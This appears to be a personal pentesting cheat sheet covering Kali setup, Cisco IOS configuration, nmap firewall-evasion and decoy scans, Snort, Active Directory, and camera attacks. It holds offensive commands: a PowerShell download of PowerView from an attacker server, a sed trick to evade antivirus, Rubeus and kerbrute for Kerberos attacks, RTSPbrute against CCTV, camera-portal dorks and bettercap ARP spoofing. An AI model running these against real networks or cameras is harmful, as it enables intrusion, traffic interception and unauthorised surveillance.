# I am the 👁️  in the sky 🔓

 <br/>

## ---VIRTUALIZATION---

You can get Virtualbox or __VMWare Workstation Player__ for free. <br/>

* For bundle file, change permissions, and run it with __sudo ./VMWare__...

* Uncompress the Kali Linux and move the folder to /home/Virtual Machines, you can rename it as just Kali.

* Choose Open Project and then select the folder Kali

>user: kali, password: kali


---

---

## NETWORKING

In IOS we have a hierarchical model: <br/>

As user: __Router>__, As privileged user: __>Router#__ and As global config mode: __>Router(config)#__ <br/>

<br/>

_Exercise #1_ <br/>

Add a router _1941_ and a PC connected by _rs232 + console_. <br/>
Go __PC__ and _Desktop_ tab - __Terminal__ - Default configuration. (9600/8/None/1/None)<br/>
...or just double click on router. <br/>

* Initial configuration: __No__ <br/>

To switch to privileged user: <br/>

>Router>enable

To switch from privileged user to global configuration: <br/>

>Router#configure terminal

__change name of device__ <br/>

>hostname R2D2

__message of the day__ <br/>

>banner motd #RESTRICTED ACCESS# 

Exit from a level: <br/>

>exit

__set a password to privileged user__ <br/>

>enable secret cisco

Where cisco is our password <br/>

__set password to console access__ <br/>

>line console 0
>password class
>login

Where class is our password and login is to force to ask for password <br/>

__set password to remote console access__ <br/>

>line vt 0 4
>password cisco
>login

__check our configuration from privileged user__ <br/>

>show running-config

__encrypt all passwords from config user__ <br/>

>service password-encryption

__config IP on interface from config__ <br/>

>interface gigabitEthernet 0/0
>ip address 192.168.10.1 255.255.255.0
>no shutdown

* Config PC with IP Address 192.168.10.2 
  from Desktop - IP Configuration and gateway 192.168.10.1
* Connect with a cross-over cable
* Check from CMD

---

---



#      👁️👁️  

## ---GATHERING---

### Information about a site ⛏️

_ping_ google.com <br/>
_nslookup_ google.com <br/>
__ipinfo.info__ <br/>
_whois_ google.com <br/>


### Spoofing your MAC address

_ifconfig_ is the comand to query your active network connection and active newtwork interfaces. <br/>
To change our MAC address, we could: <br/>

```terminal
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up
```

### Examining DNS with dig

```terminal
dig google.com ns
```

_ns_ is for __name server__ <br/>

```terminal
dig nasty-mail-server.com mx
```

_mx_ is for __mail exchange__ <br/>


### whatweb

>whatweb --help

>whatweb arh.bg.ac.rs -v

>whatweb 192.168.1.1-192.16.1.255 --agression 3 -v --no-errors

### SNORT

__IDS__ Intrusion Detection System <br/>
__IPS__ Intrusion Prevention System <br/>

>sudo apt-get update

>sudo apt-get install snort

* In Windows, install __npcap__ 
* Edit __snort.conf__
* Network to protect: __ipvar HOME_NET 192.168.20.0/24__
* Change type of bar: __var RULE_PATH ..\rules__
* Change type of bar: __var PREPROC_RULE_PATH ..\preproc_rules__
* Change type of bar: __var WHITE_LIST_PATH ..\rules__
* Change type of bar: __var BLACK_LIST_PATH ..\rules__
* Active __config logdir: ..\log__
* Change __dynamicpreprocessor__ directory C:\Snort\lib\snort_dynamicpreprocessor
* Change __dynamicengine__ directory C:\Snort\lib\snort_dynamic\sf_engine.dll
* Disable __dynamicdetection__
* Active: preprocessor sfportscan: proto {all} memcap {10000000}  sense_level {low}
* __preprocessor__ reputation: \ whitelist $WHITE_LIST_PATH/white.rules, \
* __preprocessor__ reputation: \ blacklist $BLACK_LIST_PATH/black.rules, 
* Active: preprocessor arpspoof
* Copy rules from __Linux Version__

__exec__ <br/>

>.\snort.exe -i 5 -A console -c C:\Snort\etc\snort.conf






---

---

#      👁️👁️  

## ---NMAP---

__check active hosts without ports__ <br/>

>nmap -sn -n 192.168.0.0/24

__seek for popular top 5 open ports__ <br/>

>sudo nmap -sS -n --top-ports 5 192.168.0.7

_get a variable for a IP address_ <br/>
_scan to avoid firewalls that blocks ICMP_ <br/>

```terminal
export IP="192.168.1.126"
sudo nmap -PR $IP
```

Maybe, we can get a filtered state, but could be closed <br/>

_send a scan without flags with -sN to see if they are opened_ <br/>

>sudo nmap -sN -p 22,80 $IP

_fragmentation_ <br/>

>sudo nmap -sS -n -ff -p80 192.168.0.4

-f = divides in 8 bytes / or mtu 8<br/>
--ff = divides in 16 bytes <br/>
-p80 = port 80 <br/>

_Decoy_ <br/>

>sudo nmap -sS -n -D 192.168.20.1,ME 192.168.20.128

* __-D__ = Decoy
* First IP addresses are the decoys
* ME = My IP Address
* Last IP the __target__


---

---

#      👁️👁️  

## WHIRESHARK


__TCP/IP__ <br/>

Sends data in little packages <br/>

It has 4 layers:

* Network Access (Ethernet)
* Internet (IPv4)
* Transport (UDP, TCP)
* Application (DNS, TLS)

_router_ <br/>

Divides Broadcast Domains <br/>

_switch_ <br/>

Divides Collision Domains <br/>

_npcap_ driver for link layer for Windows <br/>

_Libpcap_ driver for link layer for Linux <br/>

---

_Dumpcap_ Capture Engine <br/>


__SECTIONS__ <br/>

We have 3 basic panels:

_package list panel_ <br/>

Every little package in a row. <br/>

_details panel_ <br/>

It has two sections: <br/>
<br/>

* Metadata from Wireshark
* TCP/IP Headers


_bytes panel_ <br/>

Info in hexadecimal and ASCII <br/>

<br/>

---

---

#      👁️👁️  

## Active Directory

Stores information of resources of a network. <br/>

### Basic Elements

* Forests - The Highest level. Can contain one or more domains.
* Domains - Can contain one or more OU
* Organizational Units - Let apply Group Policies and group permissions

__EVERYTHING IS AN OBJECT!__ <br/>

### SAM - Security Account Manager

Stores information about users, groups and passwords. <br/>

The SAM DB is checked by the __LSA__ Local Security Authority <br/>

### LDAP - Lightweight Directory Access Protocol

Is an Application Protocol that lets interact with Directory Services to store, read or modify information. <br/>

__copy from kali linux to windows__ <br/>

>python2 -m SimpleHTTPServer

* The file has to be in our directory where runs the FTP.

* Now run from powershell:

>(New-Object System.NET.WebClient).DownloadFile("http://192.168.20.129:8000/PowerView.ps1", "powerview.ps1")

__run PowerView__ <br/>

AV by default has a Hash signature, we have to edit the file: <br/>

* From Kali Linux:

>sed '/<#/,/#>/d' powerview.ps1 > new_powerview.ps1

* From Powershell:

>. .\new_powerview.ps1

### ACL - Access Control List

Lists to manage and control access permitions


### KERBEROS

Authentication Protocol for Active Directory. <br/>

We can use wireshark to scan Kerberos (KRB5) where we can find: <br/>

* AS-REQ (Authentication Service Request) - Sends cname and sname
* KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED
  * User exists! - DC Requires a cipher Timestamp, otherwise: PRINCIPAL_UNKNOWN
* AS-REP (Authentication Service Reply)
* TGS (Ticket Granted Service)

>We can use kerbrut

>We can use Rubeus

https://github.com/GhostPack/Rubeus <br/>

* Go to __Compile Instructions__
* __Install__ .Net Development Desktop from Visual Studio in the given link.
* Open project (Choose _Rubeus.sln_)
* Select Rubeus folder and go to __Compile__











---

---

#      👁️👁️  

## Kali Linux

>Hunter

Run: <br/>

```terminal
theHarvester -d domain.com -b all
```

We have the option to load the webpage: __hunter.io__ <br/>


## CCTV

__hack with python__ <br/>

Install python installer: <br>

>apt install python3-pip
>apt install python3-dev pkg-config ffmpeg
>apt install -y libavformat-dev libavcodec-dev \
> libavdevice-dev libavutil-dev libswscale-dev libswresample-dev libavfilter-dev

>pip3 install cython wheel

>pip3 install rtspbrute
>git clone https://gitlab.com/woolf/RTSPbrute.git
>python3 setup.py install
>rtspbrute -t target.txt



### SNMP

### RSTP





inurl:/Portal/portal.mwsl
inurl:"view/view.shtml?id="
bettercap
net.probe on
net.show
set arp.spoof.targets 192.168.1.4
arp.spoof on
net.sniff on

